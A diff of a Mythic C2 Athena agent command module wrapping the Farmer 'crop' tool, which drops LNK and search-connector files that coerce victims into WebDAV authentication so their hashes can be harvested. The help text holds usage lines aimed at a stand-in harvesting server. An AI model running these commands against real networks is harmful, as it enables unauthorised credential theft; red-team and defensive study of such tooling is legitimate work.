@@ -1,9 +1,5 @@
-from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
-import json
-
-from .athena_utils import message_converter
-
+from mythic_container.MythicCommandBase import *
 
 class FarmerArguments(TaskArguments):
     def __init__(self, command_line, **kwargs):
@@ -99,8 +95,7 @@ class FarmerCommand(CommandBase):
     help_cmd = "crop"
     description = "Drop a file for hash collection"
     version = 1
-    help_cmd = """
-Crop https://github.com/mdsecactivebreach/Farmer
+    help_cmd = """Crop https://github.com/mdsecactivebreach/Farmer
     created by @domchell
 
 Crop is a tool that can create LNK files that initiate a WebDAV connection when browsing to a folder where it's stored.
@@ -108,11 +103,10 @@ Crop is a tool that can create LNK files that initiate a WebDAV connection when 
 Supported LNK types: .lnk, .url, .library-ms, .searchconnect-ms
 
 Drop an LNK file
-crop -targetLocation \\myserver\shared\ -targetFilename Athena.lnk -targetPath \\MyCropServer:8080\harvest -targetIcon \\MyCropServer:8080\harvest\my.ico
+crop -targetLocation \\\\myserver\\shared\\ -targetFilename Athena.lnk -targetPath \\\\MyCropServer:8080\\harvest -targetIcon \\\\MyCropServer:8080\\harvest\\my.ico
 
 Drop a .searchconnect-ms
-crop -targetLocation \\myserver\shared\ -targetFilename Athena.searchconnector-ms -targetPath \\MyCropServer:8080\harvest -recurse      
-    """
+crop -targetLocation \\\\myserver\\shared\\ -targetFilename Athena.searchconnector-ms -targetPath \\MyCropServer:8080\\harvest -recurse """
     author = "@domchell, @checkymander"
     argument_class = FarmerArguments
     attackmapping = ["T1187"]
@@ -128,9 +122,4 @@ crop -targetLocation \\myserver\shared\ -targetFilename Athena.searchconnector-m
         return response
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
-        if "message" in response:
-            user_output = response["message"]
-            await MythicRPC().execute("create_output", task_id=task.Task.ID, output=message_converter.translateAthenaMessage(user_output))
-
-        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
-        return resp
+        pass
